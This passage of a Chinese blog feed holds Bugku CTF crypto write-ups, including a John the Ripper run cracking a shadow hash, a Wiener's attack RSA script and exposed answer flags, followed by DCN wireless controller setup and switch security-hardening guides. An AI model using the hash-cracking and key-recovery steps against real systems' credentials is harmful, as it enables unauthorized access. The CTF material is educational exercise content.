class="line">    <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">'d'</span>:</span><br><span class="line">        b.append(hex(int(i[<span class="number">1</span>:])))</span><br><span class="line">    <span class="keyword">elif</span> i[<span class="number">0</span>] == <span class="string">'x'</span>:</span><br><span class="line">        b.append(<span class="string">'0'</span>+i)</span><br><span class="line">    <span class="keyword">elif</span> i[<span class="number">0</span>] == <span class="string">'o'</span>:</span><br><span class="line">        b.append(hex(int(i[<span class="number">1</span>:],<span class="number">8</span>)))</span><br><span class="line">    <span class="keyword">elif</span> i[<span class="number">0</span>] == <span class="string">'b'</span>:</span><br><span class="line">        b.append(hex(int(i[<span class="number">1</span>:],<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line">c = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> b:</span><br><span class="line">    c += j[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">print(binascii.a2b_hex(c).decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure></p><!-- flag{1e4bf81a6394de5abc005ac6e39a387b}  --><h1 id="affine"><a href="#affine" class="headerlink" title="affine"></a>affine</h1><p>放射函数，在实验吧做过类似题目<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">list = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">newlist = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(list)):</span><br><span class="line">    newlist += list[(<span class="number">17</span> * i - <span class="number">8</span>) % <span class="number">26</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">y = <span class="string">'szzyfimhyzd'</span></span><br><span class="line">x = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> y:</span><br><span class="line">    x += list[newlist.find(j)] <span class="comment">#查找新列表字符对应的位置，在旧列表同样的位置即为flag</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'flag&#123;'</span> + x + <span class="string">'&#125;'</span>)</span><br></pre></td></tr></table></figure></p><!-- flag{affineshift} --><h1 id="Crack-it"><a href="#Crack-it" class="headerlink" title="Crack it"></a>Crack it</h1><p>使用kali下的John the Ripper工具破解密码<br><figure class="highlight bash"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># john --wordlist=/usr/share/john/password.lst shadow </span></span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">"sha512crypt"</span>, but the string is also recognized as <span class="string">"crypt"</span></span><br><span class="line">Use the <span class="string">"--format=crypt"</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (sha512crypt, crypt(3) <span class="variable">$6</span>$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">hellokitty       (root)</span><br><span class="line">1g 0:00:00:02 DONE (2019-02-27 08:07) 0.4115g/s 869.1p/s 869.1c/s 869.1C/s ilovegod..celtic</span><br><span class="line">Use the <span class="string">"--show"</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">root@kali:~/Desktop<span class="comment">#</span></span><br></pre></td></tr></table></figure></p><!-- flag{hellokitty} --><h1 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h1><p>一看n、e、enc那么长，估计是Wiener’s Attack<br>使用<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">rsa-wiener-attack</a>脚本破解，这里需要修改下主函数↓<br><figure class="highlight python"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#test_is_perfect_square()</span></span><br><span class="line">    <span class="comment">#print("-------------------------")</span></span><br><span class="line">    <span class="comment"># test_hack_RSA()</span></span><br><span class="line">    N = <span class="number">460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span></span><br><span class="line">    e = <span class="number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span></span><br><span class="line">    d = hack_RSA(e,N) <span class="comment">#解除私钥d</span></span><br><span class="line">    print(d)</span><br><span class="line">    enc = <span class="number">38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span></span><br><span class="line">    m = hex(pow(enc, d, N)).rstrip(<span class="string">"L"</span>) <span class="comment">#解出二进制明文</span></span><br><span class="line">    <span class="comment"># print(m)</span></span><br><span class="line">    print(str(binascii.unhexlify(m[<span class="number">2</span>:]), encoding=<span class="string">'utf-8'</span>)) <span class="comment">#转码成明文，需要导入binascii库</span></span><br></pre></td></tr></table></figure></p><!-- flag{Wien3r_4tt@ck_1s_3AsY} --><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugku </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>无线交换机</title>
      <link href="/2018/04/21/%E6%97%A0%E7%BA%BF%E4%BA%A4%E6%8D%A2%E6%9C%BA/"/>
      <url>/2018/04/21/%E6%97%A0%E7%BA%BF%E4%BA%A4%E6%8D%A2%E6%9C%BA/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>信息安全管理大赛AC+AP部分，</p></blockquote><a id="more"></a><h1 id="部分拓扑说明"><a href="#部分拓扑说明" class="headerlink" title="部分拓扑说明"></a>部分拓扑说明</h1><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/DCN-DCWS/1.png" alt="" title="" class="">                <p></p>            </figure><p>基于dhcp option 43发现AP，所以需要先配置dhcp服务，<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">service dhcp <span class="comment">#开启服务</span></span><br><span class="line">ip dhcp excluded-address 192.168.2.1 192.168.2.2 <span class="comment">#排除地址</span></span><br><span class="line">ip dhcp pool vlan2</span><br><span class="line">network-address 192.168.2.0 255.255.255.0</span><br><span class="line">default-router 192.168.2.1</span><br><span class="line">dns-server 114.114.114.114</span><br><span class="line"></span><br><span class="line"><span class="comment">#与AP相连的接口必须划分到对应vlan，这里是vlan 2</span></span><br></pre></td></tr></table></figure></p><p><br></p><h1 id="发现AP并注册"><a href="#发现AP并注册" class="headerlink" title="发现AP并注册"></a>发现AP并注册</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#IP十进制转16进制</span></span><br><span class="line">192.168.2.2</span><br><span class="line">1100 0000.1010 1000.0000 0010.0000 0010</span><br><span class="line">C0A80202</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启option43服务</span></span><br><span class="line">ip dhcp pool ap</span><br><span class="line">option 43 hex 0104C0A80202 <span class="comment">#0104固定值，后面是16进制IP</span></span><br><span class="line">option 60 ascii udhcp 1.18.2 <span class="comment">#固定值，1.18.2是AP版本，详见配置手册</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置无线部分</span></span><br><span class="line">wireless</span><br><span class="line">no auto-ip-assign <span class="comment">#关闭IP自动查找</span></span><br><span class="line"><span class="built_in">enable</span> <span class="comment">#开启</span></span><br><span class="line">no discovery vlan-list 1 <span class="comment">#不查找vlan1，默认配置查找vlan1</span></span><br><span class="line">discovery vlan-list 2 <span class="comment">#查找vlan2</span></span><br><span class="line">static-ip  192.168.2.2 <span class="comment">#静态AC管理IP</span></span><br><span class="line">show wireless</span><br><span class="line"></span><br><span class="line">DCWS(config)<span class="comment">#show wireless ap failure status</span></span><br><span class="line"></span><br><span class="line">    MAC Address</span><br><span class="line"> (*) Peer Managed   IP Address                              Last Failure Type           Age</span><br><span class="line">------------------ --------------------------------------- ------------------------ ----------------</span><br><span class="line"> 00-03-0f-78-e2-40 192.168.2.3                             No Database Entry        0d:00:00:15</span><br><span class="line"></span><br><span class="line"><span class="comment">#将AP注册到数据库</span></span><br><span class="line">wireless</span><br><span class="line">DCWS(config-wireless)<span class="comment">#ap database 00-03-0f-78-e2-40</span></span><br><span class="line">DCWS(config-ap)<span class="comment">#exit</span></span><br><span class="line">DCWS(config-wireless)<span class="comment">#ap authentication none</span></span><br><span class="line">DCWS(config-wireless)<span class="comment">#show wireless ap status</span></span><br><span class="line"></span><br><span class="line">    MAC Address                                                            Configuration</span><br><span class="line"> (*) Peer Managed  IP Address                              Profile Status     Status           Age</span><br><span class="line">------------------ --------------------------------------- ------- ------- ------------- --------------</span><br><span class="line"> 00-03-0f-78-e2-40 192.168.2.3                                     Failed  Not Config    0d:00:00:58</span><br><span class="line"></span><br><span class="line">Total Access Points............................ 1</span><br><span class="line">DCWS(config-wireless)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><br></p><h1 id="无线网络配置"><a href="#无线网络配置" class="headerlink" title="无线网络配置"></a>无线网络配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#network配置</span></span><br><span class="line">DCWS(config-wireless)<span class="comment">#network 2</span></span><br><span class="line">DCWS(config-network)<span class="comment">#security mode wpa-personal //认证模式wpa</span></span><br><span class="line">DCWS(config-network)<span class="comment">#ssid DCN</span></span><br><span class="line">DCWS(config-network)<span class="comment">#vlan 2</span></span><br><span class="line">DCWS(config-network)<span class="comment">#wpa key chinaskill //认证密码</span></span><br><span class="line">DCWS(config-wireless)<span class="comment">#network 3</span></span><br><span class="line">DCWS(config-network)<span class="comment">#security mode none //不认证</span></span><br><span class="line">DCWS(config-network)<span class="comment">#ssid guest</span></span><br><span class="line">DCWS(config-network)<span class="comment">#vlan 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置AP的配置文件</span></span><br><span class="line">DCWS(config-wireless)<span class="comment">#ap profile 2 //配置AP 1配置</span></span><br><span class="line">DCWS(config-ap-profile)<span class="comment">#radio 2 //选择工作频率，1位2.4，位5</span></span><br><span class="line">DCWS(config-ap-profile-radio)<span class="comment">#enable //打开</span></span><br><span class="line">DCWS(config-ap-profile-radio)<span class="comment">#vap 1 //一个vap对应一个network</span></span><br><span class="line">DCWS(config-ap-profile-vap)<span class="comment">#enable</span></span><br><span class="line">DCWS(config-ap-profile-vap)<span class="comment">#network 2</span></span><br><span class="line">DCWS(config-ap-profile-radio)<span class="comment">#vap 2</span></span><br><span class="line">DCWS(config-ap-profile-vap)<span class="comment">#enable</span></span><br><span class="line">DCWS(config-ap-profile-vap)<span class="comment">#network 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#下发配置</span></span><br><span class="line">DCWS<span class="comment">#wireless ap profile apply 1</span></span><br><span class="line">All configurations will be send to the aps associated to this profile and associated clients on these aps will be disconnected.</span><br><span class="line">Are you sure you want to apply the profile configuration? [Y/N] y</span><br><span class="line">AP Profile apply is <span class="keyword">in</span> progress.</span><br><span class="line">DCWS<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意：network1、profile1、vap0都有默认配置，尽量从第二个开始</span></span><br></pre></td></tr></table></figure><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由交换技术 </tag>
            
            <tag> Cisco </tag>
            
            <tag> WirelessSwitch </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>交换机安全加固</title>
      <link href="/2018/04/21/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
      <url>/2018/04/21/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>最近要准备信息安全管理大赛，本文梳理下交换机加固的知识，比赛是基于神州数码（DCN）的设备，命令行是思科类型</p></blockquote><a id="more"></a><h1 id="身份验证"><a href="#身份验证" class="headerlink" title="身份验证"></a>身份验证</h1><h2 id="用户创建"><a href="#用户创建" class="headerlink" title="用户创建"></a>用户创建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username <span class="built_in">test</span> privilege 15 password 0 <span class="built_in">test</span> <span class="comment">#用户名、管理级别（15权限最大）密码</span></span><br><span class="line">authentication line vty login <span class="built_in">local</span> <span class="comment">#设置vty用户登陆本地验证</span></span><br><span class="line"><span class="built_in">enable</span> password <span class="built_in">test</span> <span class="comment">#进入配置模式设置密码</span></span><br></pre></td></tr></table></figure><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-server <span class="built_in">enable</span> <span class="comment">#开启ssh服务</span></span><br><span class="line">ssh-server timeout 300 <span class="comment">#ssh登录超时，单位秒</span></span><br><span class="line">ssh-server max-connection 5 <span class="comment">#ssh登陆最大数量</span></span><br><span class="line">ssh-server host-key create rsa <span class="comment">#ssh秘钥，基于RSA算法</span></span><br></pre></td></tr></table></figure><h2 id="web管理"><a href="#web管理" class="headerlink" title="web管理"></a>web管理</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ip http server <span class="comment">#开启http服务，关闭前面加no</span></span><br><span class="line">authentication line web login <span class="built_in">local</span> <span class="comment">#设置web用户登陆本地验证</span></span><br><span class="line"><span class="comment">#https</span></span><br><span class="line">ip http secure-ciphersuite des-cbc-sha <span class="comment">#设置加密方式</span></span><br><span class="line">ip http secure-port 1025 <span class="comment">#设置访问端口，1025-65535</span></span><br><span class="line">ip http secure-server <span class="comment">#开启https，必须在最后</span></span><br></pre></td></tr></table></figure><h2 id="802-1x认证"><a href="#802-1x认证" class="headerlink" title="802.1x认证"></a>802.1x认证</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">radius-server authentication host 10.103.117.7 <span class="comment">#配置认证服务器</span></span><br><span class="line">radius-server accounting host 10.103.117.7  <span class="comment">#配置计费服务器</span></span><br><span class="line">radius-server key 123   <span class="comment">#配置认证服务器的密钥</span></span><br><span class="line">aaa <span class="built_in">enable</span>   <span class="comment">#开启AAA认证</span></span><br><span class="line">aaa-accounting <span class="built_in">enable</span>  <span class="comment">#开启AAA计费功能</span></span><br><span class="line">dot1x <span class="built_in">enable</span>  <span class="comment">#开启802.1x认证</span></span><br><span class="line">dot1x user free-resource 10.103.117.0 255.255.255.0 <span class="comment">#设置认证前可访问资源</span></span><br><span class="line"></span><br><span class="line">interface Ethernet 0/0/1   <span class="comment">#进入端口</span></span><br><span class="line">dot1x <span class="built_in">enable</span>   <span class="comment">#开启端口的1X认证</span></span><br><span class="line">dot1x port-method userbased advanced <span class="comment">#设置认证方式为userbased</span></span><br><span class="line">dot1x port-control auto  <span class="comment">#设置授权状态为auto</span></span><br></pre></td></tr></table></figure><p><br></p><h1 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h1><h2 id="网络日志审计"><a href="#网络日志审计" class="headerlink" title="网络日志审计"></a>网络日志审计</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将指定接口的流量镜像到流量审计服务器</span></span><br><span class="line">monitor session 1 <span class="built_in">source</span> inter ethernet 1/0/x both <span class="comment">#防火墙的接口</span></span><br><span class="line">monitor session 1 destination interface ethernet  1/0/x  <span class="comment">#日志的接口</span></span><br><span class="line">show monitor</span><br></pre></td></tr></table></figure><h2 id="交换机常规日志"><a href="#交换机常规日志" class="headerlink" title="交换机常规日志"></a>交换机常规日志</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">info-center <span class="built_in">enable</span> <span class="comment">#开启日志记录</span></span><br><span class="line">info-center loghost 192.168.1.1 facility local7 channel 9 <span class="comment">#将log发送给日志服务器</span></span><br></pre></td></tr></table></figure><p><br></p><h1 id="二层防护"><a href="#二层防护" class="headerlink" title="二层防护"></a>二层防护</h1><h2 id="端口安全"><a href="#端口安全" class="headerlink" title="端口安全"></a>端口安全</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mac-address-learning cpu-control <span class="comment">#必须先全局开启mac地址学习</span></span><br><span class="line">interface ethernet 1/0/2 <span class="comment">#进入接口接口</span></span><br><span class="line">switchport port-security <span class="comment">#开启本接口的端口安全</span></span><br><span class="line">switchport port-security maximum 5 <span class="comment">#mac地址最大学习数量5</span></span><br><span class="line">switchport port-security mac-address sticky <span class="comment">#mac地址自动学习</span></span><br><span class="line">switchport port-security violation restrict recovery 300 <span class="comment">#当有违反规则的mac地址数据包通过限制接口，并在300秒后恢复，</span></span><br><span class="line"><span class="comment">#除此之外还有，shutdown、protect、recovery</span></span><br><span class="line">switchport port-security aging time 1 <span class="comment">#端口老化时间，用于忘记已经动态记住的mac地址</span></span><br><span class="line">switchport port-security mac-address 2F-FF-FF-FF-FF-2F <span class="comment">#手动绑定mac地址</span></span><br></pre></td></tr></table></figure><h2 id="私有vlan特性"><a href="#私有vlan特性" class="headerlink" title="私有vlan特性"></a>私有vlan特性</h2><p>详见ppt最后：<a href="https://wenku.baidu.com/view/b180f202bed5b9f3f90f1c99.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/b180f202bed5b9f3f90f1c99.html</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在DCRS交换机上配置私有VLAN特性阻止PC-3发起ARP DOS/DDOS渗透测试，并将DCRS交换机该配置信息截图。</span></span><br><span class="line"><span class="comment">#DCRS交换机该配置信息：</span></span><br><span class="line"><span class="comment">#Flag：</span></span><br><span class="line">vlan 20 <span class="comment">#PC-1连入的VLAN</span></span><br><span class="line">private-vlan isolated</span><br><span class="line">vlan 30 <span class="comment">#PC-3连入的VLAN</span></span><br><span class="line">private-vlan isolated</span><br><span class="line">vlan 10 <span class="comment">#DCST服务器场景连入的VLAN</span></span><br><span class="line">private-vlan primary</span><br><span class="line">private-vlan association 20;30</span><br><span class="line"></span><br><span class="line"><span class="comment">#私有vlan注意事项</span></span><br><span class="line"><span class="comment">#私有vlan配置的注意点</span></span><br><span class="line">  <span class="comment">#只有不包含任何以太网端口的vlan才能被设置Private VLAN</span></span><br><span class="line">  <span class="comment">#只有设置了关联关系的private vlan才能将Access类型的以太网端口设置为客户端</span></span><br><span class="line">  <span class="comment">#普通VLAN若被设置成Private VLAN后，会自动将所属以太网端口清空</span></span><br><span class="line"><span class="comment">#配置关联的注意点</span></span><br><span class="line">  <span class="comment">#只有Primary类型的VLAN才能设置Private VLAN关联关系</span></span><br></pre></td></tr></table></figure></p><h2 id="网关保护：ARP-Guard"><a href="#网关保护：ARP-Guard" class="headerlink" title="网关保护：ARP Guard"></a>网关保护：ARP Guard</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Interface Ethernet1/0/10 <span class="comment">#特定接口，不支持vlan接口</span></span><br><span class="line">arp-guard ip 192.168.10.1 <span class="comment">#开启网关保护</span></span><br></pre></td></tr></table></figure><h2 id="MAC地址访问控制列表，类似于ip-access-list"><a href="#MAC地址访问控制列表，类似于ip-access-list" class="headerlink" title="MAC地址访问控制列表，类似于ip access-list"></a>MAC地址访问控制列表，类似于ip access-list</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mac-access-list extended name <span class="comment">#创建mac地址访问控制列表，表名为“name”</span></span><br><span class="line">deny host-source-mac 00-ff-51-be-ad-32 host-destination-mac 00-ff-51-be-ad-32 <span class="comment">#拒绝源mac地址为”00-ff-51-be-ad-32的主机访问目的地址为“00-ff-51-be-ad-32”的主机</span></span><br><span class="line">permit any-source-mac any-destination-mac <span class="comment">#允许所有源主机访问目的主机</span></span><br><span class="line"><span class="comment">#在接口上启用</span></span><br><span class="line">Interface Ethernet1/0/10</span><br><span class="line">mac access-group name <span class="keyword">in</span></span><br></pre></td></tr></table></figure><h2 id="防ARP扫描"><a href="#防ARP扫描" class="headerlink" title="防ARP扫描"></a>防ARP扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">anti-arpscan <span class="built_in">enable</span> <span class="comment">#启动防ARP扫描功能</span></span><br><span class="line">anti-arpscan recovery <span class="built_in">enable</span> <span class="comment">#开启自定恢复</span></span><br><span class="line">anti-arpscan recovery time 3600 <span class="comment">#配置自动恢复时间</span></span><br><span class="line">anti-arpscan trust ip 192.168.10.1 255.255.255.0  <span class="comment">#配置信任IP，非必要</span></span><br><span class="line"></span><br><span class="line">Interface Ethernet1/0/2 <span class="comment">#与主机相连的接口</span></span><br><span class="line">anti-arpscan trust port <span class="comment">#配置信任接口</span></span><br><span class="line"></span><br><span class="line">interface ethernet 1/0/3 <span class="comment">#与交换机相连的接口</span></span><br><span class="line">anti-arpscan trust supertrust-port <span class="comment">#超级信任端口，对端交换机也许开启功能并配置接口</span></span><br></pre></td></tr></table></figure><h2 id="Arp-local-proxy"><a href="#Arp-local-proxy" class="headerlink" title="Arp local proxy"></a>Arp local proxy</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#功能：某种实际的应用环境中，为了防止 ARP 的欺骗，要求汇聚层的交换机实现local arp proxy功能，</span></span><br><span class="line"><span class="comment">#限制 ARP 报文在同一 vlan 内的转发，从而引导数据流量通过交换机进行 L3转发。</span></span><br><span class="line">interface vlan 10</span><br><span class="line">ip <span class="built_in">local</span> proxy-arp</span><br></pre></td></tr></table></figure><h2 id="ARP动态监测"><a href="#ARP动态监测" class="headerlink" title="ARP动态监测"></a>ARP动态监测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#需要和dhcp结合使用</span></span><br><span class="line">ip arp inspection vlan 1 <span class="comment">#开启arp检测的vlan号</span></span><br><span class="line">interface e1/0/18</span><br><span class="line">ip arp inspection trust <span class="comment">#配置信任接口</span></span><br><span class="line"></span><br><span class="line">interface vlan 30</span><br><span class="line">ip arp dynamic maximum 50 <span class="comment">#VLAN接口的ARP阀值为50</span></span><br></pre></td></tr></table></figure><h2 id="环路检测"><a href="#环路检测" class="headerlink" title="环路检测"></a>环路检测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置端口环路检测</span></span><br><span class="line">loopback-detection interval-time 35 15</span><br><span class="line"></span><br><span class="line">int ethernet 1/0/1</span><br><span class="line">loopback-detection special-vlan 1-3</span><br><span class="line">loopback-detection control [shutdown,block]</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果使用 block 控制，必须全局启动 mstp，并且配置生成树实例与 vlan 的对应关系</span></span><br><span class="line">spanning-tree</span><br><span class="line">spanning-tree mst configuration</span><br><span class="line">instance 1 vlan 1</span><br><span class="line">instance 2 vlan 2</span><br></pre></td></tr></table></figure><h2 id="广播风暴抑制"><a href="#广播风暴抑制" class="headerlink" title="广播风暴抑制"></a>广播风暴抑制</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">interface ethernet 1/0/10 <span class="comment">#vlan对应接口</span></span><br><span class="line">storm-control broadcast 400 <span class="comment">#速率400</span></span><br><span class="line">storm-control unicast 400</span><br><span class="line">storm-control multicast 400</span><br></pre></td></tr></table></figure><p><br></p><h1 id="DCHP防护"><a href="#DCHP防护" class="headerlink" title="DCHP防护"></a>DCHP防护</h1><h2 id="DHCP-snooping"><a href="#DHCP-snooping" class="headerlink" title="DHCP snooping"></a>DHCP snooping</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 